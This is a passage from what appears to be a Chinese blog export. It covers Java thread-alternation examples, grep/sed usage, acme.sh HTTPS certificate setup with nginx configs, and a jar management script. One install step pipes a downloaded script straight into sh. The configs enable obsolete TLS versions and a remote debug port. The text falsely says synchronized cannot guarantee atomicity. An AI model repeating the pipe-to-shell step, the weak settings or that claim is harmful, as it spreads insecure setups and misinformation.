<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LockConditionTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个可重入锁</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Lock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义锁的字母线程条件</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Condition letterCondition = lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义锁的数字线程条件</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Condition numberCondition = lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] LETTER = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer[] NUMBER = <span class="keyword">new</span> Integer[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 优先输出数字，字母线程等待</span></span><br><span class="line">                letterCondition.await();</span><br><span class="line">                <span class="keyword">for</span> (String str : LETTER)&#123;</span><br><span class="line">                    <span class="comment">// 打印字母</span></span><br><span class="line">                    System.out.print(str);</span><br><span class="line">                    <span class="comment">// 通知数字线程运行</span></span><br><span class="line">                    numberCondition.signal();</span><br><span class="line">                    <span class="comment">// 本线程等待</span></span><br><span class="line">                    letterCondition.await();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 保证线程正常关闭</span></span><br><span class="line">                numberCondition.signal();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;LETTER&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (Integer num : NUMBER)&#123;</span><br><span class="line">                    <span class="comment">// 打印数字</span></span><br><span class="line">                    System.out.print(num);</span><br><span class="line">                    <span class="comment">// 通知字母线程运行</span></span><br><span class="line">                    letterCondition.signal();</span><br><span class="line">                    <span class="comment">// 本线程等待</span></span><br><span class="line">                    numberCondition.await();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 保证线程正常关闭</span></span><br><span class="line">                letterCondition.signal();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;NUMBER&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="volatile方式"><a href="#volatile方式" class="headerlink" title="volatile方式"></a>volatile方式</h5><p>volatile关键字保证了不同线程，对变量进行操作的可见性，以及读和写的原子性，而且它禁止指令重排，所以它还具备有序性。</p>
<p>因此，我们可以通过这个关键字特性，能够轻易的完成以上案例的要求。</p>
<p>演示案例实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VolatileTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义flag，=1 运行数字线程，=2 运行字母线程，优先打印数字，初始设置为1，</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] LETTER = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer[] NUMBER = <span class="keyword">new</span> Integer[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (String str : LETTER)&#123;</span><br><span class="line">                <span class="comment">// 当flag=2的时候才打印字母</span></span><br><span class="line">                <span class="keyword">while</span> (flag != <span class="number">2</span>)&#123;&#125;</span><br><span class="line">                <span class="comment">// 打印</span></span><br><span class="line">                System.out.print(str);</span><br><span class="line">                <span class="comment">// 设置flag为1，数字</span></span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;LETTER&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (Integer num : NUMBER)&#123;</span><br><span class="line">                <span class="comment">// 当flag=1的时候才打印数字</span></span><br><span class="line">                <span class="keyword">while</span> (flag != <span class="number">1</span>)&#123;&#125;</span><br><span class="line">                <span class="comment">// 打印</span></span><br><span class="line">                System.out.print(num);</span><br><span class="line">                <span class="comment">// 设置flag为1，字母</span></span><br><span class="line">                flag = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;NUMBER&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="AtomicInteger方式"><a href="#AtomicInteger方式" class="headerlink" title="AtomicInteger方式"></a>AtomicInteger方式</h5><p>我们都知道java并发机制中主要有三个特性需要我们去考虑：原子性、可见性和有序性。</p>
<p>synchronized关键字可以保证可见性和有序性却无法保证原子性，而AtomicInteger的作用就是为了保证原子性。</p>
<p>通过它的原子性，我们可以像volatile一样，轻易的完成案例想要的效果，</p>
<p>演示案例实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AtomicIntegerTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义AtomicInteger flag，=1 运行数字线程，=2 运行字母线程，优先打印数字，初始设置为1，</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AtomicInteger flag = <span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] LETTER = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer[] NUMBER = <span class="keyword">new</span> Integer[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (String str : LETTER)&#123;</span><br><span class="line">                <span class="comment">// 当flag=2的时候才打印字母</span></span><br><span class="line">                <span class="keyword">while</span> (flag.get() != <span class="number">2</span>)&#123;&#125;</span><br><span class="line">                <span class="comment">// 打印</span></span><br><span class="line">                System.out.print(str);</span><br><span class="line">                <span class="comment">// 设置flag为1，数字</span></span><br><span class="line">                flag.set(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;LETTER&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (Integer num : NUMBER)&#123;</span><br><span class="line">                <span class="comment">// 当flag=1的时候才打印数字</span></span><br><span class="line">                <span class="keyword">while</span> (flag.get() != <span class="number">1</span>)&#123;&#125;</span><br><span class="line">                <span class="comment">// 打印</span></span><br><span class="line">                System.out.print(num);</span><br><span class="line">                <span class="comment">// 设置flag为2，字母</span></span><br><span class="line">                flag.set(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;NUMBER&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java</category>
        <category>线程</category>
      </categories>
      <tags>
        <tag>线程通讯</tag>
        <tag>synchronized</tag>
        <tag>notify</tag>
        <tag>wait</tag>
        <tag>volatile</tag>
        <tag>LockSupport</tag>
      </tags>
  </entry>
  <entry>
    <title>grep与cat、sed的结合</title>
    <url>/2020/06/20/shell-grep-cat-sed/</url>
    <content><![CDATA[<h4 id="grep查找命令"><a href="#grep查找命令" class="headerlink" title="grep查找命令"></a>grep查找命令</h4><p>grep命令是linux系统中，最常用的文件字符串查找命令，职业生涯中，我们几乎离不开它。</p>
<p>下面是它最简单的用法，不过实际情况下，我们通常会添加很多参数或结合其他的命令去进行使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;&lt;pattern&gt;&quot; &lt;fileName&gt;</span><br></pre></td></tr></table></figure>
<p>常用命令参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;fileName&gt;: 文件名称，多个文件使用空格隔开</span><br><span class="line">&lt;pattern&gt;: 匹配字符</span><br><span class="line">-n : 显示行号</span><br><span class="line">-i : 忽略字符大小写</span><br><span class="line">-l : 列出符合条件的文件名</span><br><span class="line">-r : 查找所有子目录</span><br><span class="line">-w : 只显示整行全匹配</span><br><span class="line">-o : 只显示匹配的关键字部分</span><br><span class="line">-A &lt;num&gt;: 关键字所在行、以及之后num行</span><br><span class="line">-B &lt;num&gt;: 关键字所在行、以及之前num行</span><br><span class="line">-C &lt;num&gt;: 关键字所在行、以及前后num行</span><br><span class="line">–include&#x3D;&quot;*.txt&quot;: 仅查找指定后缀的文件</span><br><span class="line">&gt; file: 将查询结果保存到文件中</span><br><span class="line">&gt;&gt; file: 将查询结果追加到文件中</span><br></pre></td></tr></table></figure>
<p>如，查询哪些文件中包含“ok”：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;ok&quot;</span> -r -l --include=<span class="string">&quot;*&quot;</span> ./</span><br></pre></td></tr></table></figure>

<h4 id="grep和cat-tail的结合"><a href="#grep和cat-tail的结合" class="headerlink" title="grep和cat/tail的结合"></a>grep和cat/tail的结合</h4><p>通过grep和cat/tail的结合，我们可以轻易的实现返回文件中的关键字所在行、以及附近指定行的内容，尤其是在我们查询程序日志的时候，用的非常多。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &lt;fileName&gt; | grep &lt;pattern&gt; &lt;cmd&gt;</span><br><span class="line">或</span><br><span class="line">tail -f &lt;fileName&gt; | grep &lt;pattern&gt; &lt;cmd&gt;</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;fileName&gt;：文件名称，多个文件使用空格隔开</span><br><span class="line">&lt;pattern&gt;：匹配字符</span><br><span class="line">&lt;cmd&gt;：grep命令参数</span><br></pre></td></tr></table></figure>
<p>cat结合示例：在文件default.log中查找“异常”，并收集前后10行记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat default.log | grep <span class="string">&quot;异常&quot;</span> -C 10</span><br></pre></td></tr></table></figure>
<p>tail结合示例：在文件default.log中查找“异常”，并进行实时收集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tail -f default.log | grep <span class="string">&quot;异常&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="grep和sed的结合"><a href="#grep和sed的结合" class="headerlink" title="grep和sed的结合"></a>grep和sed的结合</h4><p>sed命令是用来编辑一个或多个文件、简化对文件反复操作的神器，它和grep的结合令我们的文件操作起来更加的得心应手。<br>我们下面就来看看，它能给我们带来怎样的体验。</p>
<p>sed语法介绍:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed &lt;命令参数&gt; &lt;动作&gt; &lt;文件&gt;</span><br></pre></td></tr></table></figure>
<p>常用命令参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-i: 直接修改配合的文件内容</span><br><span class="line">-e: 不修改原文件，仅输出，通常可以和“&gt;或&gt;&gt;”命令结合，输出到新文件中</span><br></pre></td></tr></table></figure>

<p>常用动作说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s: 替换字符，替换指定的字符串，如：sed -i &#39;s&#x2F;匹配字符&#x2F;新字符&#x2F;g&#39; a.txt，末尾的&#x2F;g表示替换所有匹配的字符</span><br><span class="line">a: 新增行，在指定行或指定范围的行的下一行新增内容，如： sed -i &#39;2a\bbb&#39; a.txt</span><br><span class="line">i: 新增行，在指定行或指定范围的行的上一行新增内容，如： sed -i &#39;2i\bbb&#39; a.txt</span><br><span class="line">c: 替换行，替换指定行或指定范围的行的内容，如：sed -i &#39;3,5c\replacestr&#39; a.txt</span><br><span class="line">d: 删除行，删除指定行或指定范围的行，如： sed -i &#39;3d&#39; a.txt </span><br></pre></td></tr></table></figure>
<p>注: 动作前面的数字表示第几号，或者几行到几行</p>
<p>扩展案例：<br>查找某个文件中的关键字，并在其下新增一行数据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/关键字/a\新增的一行数据&#x27;</span> a.txt</span><br></pre></td></tr></table></figure>

<p>grep与sed命令结合的示例:</p>
<p>上面我们已经了解sed命令的特性，那我们现在就试试，它和grep命令的结合，究竟能撞出怎样的火花？</p>
<p>下面的命令实现的是：将某个目录以及子目录的所有文件中的关键字“ok”统一替换为“yes”</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/ok/yes/g&#x27;</span> `grep <span class="string">&quot;ok&quot;</span> -r -l --include=<span class="string">&quot;*&quot;</span> ./`</span><br></pre></td></tr></table></figure>
<p>上面 `` 括起来的grep命令，表示将grep命令查询的结果作为操作文件。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>查找关键字</tag>
        <tag>关键字替换</tag>
      </tags>
  </entry>
  <entry>
    <title>使用acme.sh管理https证书</title>
    <url>/2020/07/17/shell-https-acme-sh/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;最近在github上发现一个项目”acme.sh“，相当强大，它实现了 acme 协议, 可以从 letsencrypt 生成免费证书，并自动更新证书，解决了证书申请和更换的痛点。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;就这一点，就已经体现了这个项目的价值了，给作者赞一个。而我也是https证书申请替换的深度受害者，看到这个项目后，立刻着手实践了一把，别说，这效果还真不错。</p>
<p>github地址：<a href="https://github.com/acmesh-official/acme.sh">链接地址</a></p>
<h4 id="acme-sh安装"><a href="#acme-sh安装" class="headerlink" title="acme.sh安装"></a>acme.sh安装</h4><p>安装很容易，只需要一个简单的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl  https://get.acme.sh | sh</span><br></pre></td></tr></table></figure>
<p>设置别名，方便后面直接调用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> acme.sh=~/.acme.sh/acme.sh</span><br></pre></td></tr></table></figure>
<p>安装完成后，会自动创建一个cronjob，每天 0:00 点自动检测所有的证书，如果快过期了，就会自动更新证书。我们可以通过下面的命令查看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>

<h4 id="nginx配置静态网页"><a href="#nginx配置静态网页" class="headerlink" title="nginx配置静态网页"></a>nginx配置静态网页</h4><p>1，创建nginx证书，指定需要生成证书的域名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">acme.sh --issue  -d u.32e.co   --nginx</span><br></pre></td></tr></table></figure>
<p>注：上面这个命令执行之前，需要先将nginx的域名配置好，否则会提示错误：“Can not find conf file for domain u.32e.co”，示例可参考文末“申请配置示例”</p>
<p>2，设置证书存放路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /home/cert/u.32e.co</span><br></pre></td></tr></table></figure>
<p>3，将生成的证书安装到指定路径，并设置自动更新</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">acme.sh --install-cert -d u.32e.co \</span><br><span class="line">--key-file       /home/cert/u.32e.co/key.pem  \</span><br><span class="line">--fullchain-file /home/cert/u.32e.co/cert.pem \</span><br><span class="line">--reloadcmd     <span class="string">&quot;nginx -s reload&quot;</span></span><br></pre></td></tr></table></figure>
<p>注：这里文档倒是说要使用：“force-reload”，才能正常更新加载。不过貌似直接reload也能重新加载，实在不行甚至可以直接拼接命令：“nginx -s stop;nginx”</p>
<p>4，证书和自动更新已经设置好后，我们就开始配置ngix，开放443端口、设置证书路径和其他参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        listen       443 ssl http2; </span><br><span class="line">        server_name  u.32e.co;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#如果打开，则默认全部走https</span></span><br><span class="line">        <span class="comment">#ssl on;   </span></span><br><span class="line">        ssl_certificate   /home/cert/u.32e.co/cert.pem;</span><br><span class="line">        ssl_certificate_key  /home/cert/u.32e.co/key.pem;</span><br><span class="line">   </span><br><span class="line">        <span class="comment">#ssl性能调优</span></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class="line">        ssl_ciphers EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line">        ssl_session_timeout 10m;</span><br><span class="line">        ssl_session_cache <span class="built_in">builtin</span>:1000 shared:SSL:10m;</span><br><span class="line">        ssl_stapling on;</span><br><span class="line">        ssl_stapling_verify on;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 开启gzip压缩</span></span><br><span class="line">        gzip on;</span><br><span class="line">        <span class="comment"># 设置中文编码</span></span><br><span class="line">        charset utf-8,gbk;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   /home/www_utils;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="nginx配置动态服务"><a href="#nginx配置动态服务" class="headerlink" title="nginx配置动态服务"></a>nginx配置动态服务</h4><p>1，我这里使用是java的springboot项目，端口：8080。创建证书的方法都是一样的，我们直接看nginx要如何配置的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upstream server_pool&#123;</span><br><span class="line">	server 127.0.0.1:8080;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        listen       443 ssl http2; </span><br><span class="line">        server_name  k.32e.co;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#如果打开，则默认全部走https</span></span><br><span class="line">        <span class="comment">#ssl on;   </span></span><br><span class="line">        ssl_certificate   /home/cert/k.32e.co/cert.pem;</span><br><span class="line">        ssl_certificate_key  /home/cert/k.32e.co/key.pem;</span><br><span class="line">   </span><br><span class="line">        <span class="comment">#ssl性能调优</span></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class="line">        ssl_ciphers EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line">        ssl_session_timeout 10m;</span><br><span class="line">        ssl_session_cache <span class="built_in">builtin</span>:1000 shared:SSL:10m;</span><br><span class="line">        ssl_stapling on;</span><br><span class="line">        ssl_stapling_verify on;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 开启gzip压缩</span></span><br><span class="line">        gzip on;</span><br><span class="line">        <span class="comment"># 设置中文编码</span></span><br><span class="line">        charset utf-8,gbk;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#缓冲区设置</span></span><br><span class="line">        client_max_body_size 100m;</span><br><span class="line">        client_body_buffer_size 2M;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">          proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">          proxy_set_header X-Forwarded-For <span class="variable">$remote_addr</span>;</span><br><span class="line"></span><br><span class="line">          proxy_max_temp_file_size 2048M;</span><br><span class="line">          proxy_connect_timeout 600;</span><br><span class="line">          proxy_read_timeout 600;</span><br><span class="line">          proxy_send_timeout 600;</span><br><span class="line"></span><br><span class="line">          proxy_buffering on;</span><br><span class="line">          proxy_buffer_size 4k;</span><br><span class="line">          proxy_buffers 8 1M;</span><br><span class="line">          proxy_busy_buffers_size 2M;</span><br><span class="line"></span><br><span class="line">          proxy_pass http://server_pool;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>2，如此，就结束了，确实很简单，等到证书快过期的时候，脚本设置的定时任务会自动去更新证书，我们也就不用去关注了。</p>
<h4 id="申请配置示例"><a href="#申请配置示例" class="headerlink" title="申请配置示例"></a>申请配置示例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  u.32e.co;</span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">            root   &#x2F;;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>https</tag>
        <tag>acme</tag>
      </tags>
  </entry>
  <entry>
    <title>java-jar维护脚本</title>
    <url>/2019/05/01/shell-java-jar-manage/</url>
    <content><![CDATA[<h4 id="脚本内容"><a href="#脚本内容" class="headerlink" title="脚本内容"></a>脚本内容</h4><p>现在越来越多的程序都用docker容器来管理了，不过依旧有很多的程序，是直接在linux上使用jar方式管理的，那么编写一个易用的脚本来管理是必不可少的。</p>
<p>脚本示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">jar_path=<span class="string">&#x27;/home/pro-mall/ex-pro.jar&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JVM参数</span></span><br><span class="line">JVM_OPTS=<span class="string">&quot;-Dspring.profiles.active=prod&quot;</span></span><br><span class="line"><span class="comment"># JVM参数 debug模式</span></span><br><span class="line">JVM_OPTS_DEBUG=<span class="string">&quot;-Dspring.profiles.active=prod -Xdebug -Xrunjdwp:server=y,transport=dt_socket,address=10000,suspend=n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">start</span></span>()&#123;</span><br><span class="line">    PID=`ps -ef |grep java|grep <span class="variable">$jar_path</span>|grep -v grep|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [ x<span class="string">&quot;<span class="variable">$PID</span>&quot;</span> != x<span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	    <span class="built_in">echo</span>  -e <span class="string">&quot;\033[0;31m 程序 <span class="variable">$jar_path</span> 正在运行中，请先停止！ \033[0m&quot;</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    <span class="keyword">if</span> [[ ! -f <span class="string">&quot;<span class="variable">$jar_path</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span>  -e <span class="string">&quot;\033[0;31m <span class="variable">$jar_path</span> 不存在，无法操作命令！ \033[0m&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            nohup java -jar <span class="variable">$JVM_OPTS</span> <span class="variable">$jar_path</span>  &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">		    <span class="built_in">echo</span>  -e <span class="string">&quot;\033[0;34m 启动 <span class="variable">$jar_path</span> 成功！\033[0m&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">debug</span></span>()&#123;</span><br><span class="line">    PID=`ps -ef |grep java|grep <span class="variable">$jar_path</span>|grep -v grep|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [ x<span class="string">&quot;<span class="variable">$PID</span>&quot;</span> != x<span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	    <span class="built_in">echo</span>  -e <span class="string">&quot;\033[0;31m 程序 <span class="variable">$jar_path</span> 正在运行中，请先停止！ \033[0m&quot;</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> [[ ! -f <span class="string">&quot;<span class="variable">$jar_path</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span>  -e <span class="string">&quot;\033[0;31m <span class="variable">$jar_path</span> 不存在，无法操作命令！ \033[0m&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            nohup java -jar <span class="variable">$JVM_OPTS_DEBUG</span> <span class="variable">$jar_path</span>  &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">		    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m Debug模式 启动 <span class="variable">$jar_path</span> 成功！端口：10000 \033[0m&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">stop</span></span>()&#123;</span><br><span class="line">	PID=`ps -ef |grep java|grep <span class="variable">$jar_path</span>|grep -v grep|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [ x<span class="string">&quot;<span class="variable">$PID</span>&quot;</span> != x<span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">kill</span> -9 <span class="variable">$PID</span></span><br><span class="line">		<span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m <span class="variable">$jar_path</span> 已停止 \033[0m&quot;</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">echo</span> -e <span class="string">&quot;\033[0;31m 程序 <span class="variable">$jar_path</span> 未启动，不能操作！ \033[0m&quot;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">restart</span></span>()&#123;</span><br><span class="line">    stop</span><br><span class="line">    sleep 2</span><br><span class="line">    start</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> status()</span><br><span class="line">&#123;</span><br><span class="line">    PID=`ps -ef |grep java|grep <span class="variable">$jar_path</span>|grep -v grep|wc -l`</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$PID</span> != 0 ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m 程序 <span class="variable">$jar_path</span> 正在运行中 \033[0m&quot;</span></span><br><span class="line">        PID_NUM=`ps -ef |grep java|grep <span class="variable">$jar_path</span>|grep -v grep|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m 程序对应的PID： <span class="variable">$PID_NUM</span> \033[0m&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;31m 程序 <span class="variable">$jar_path</span> 没有运行！ 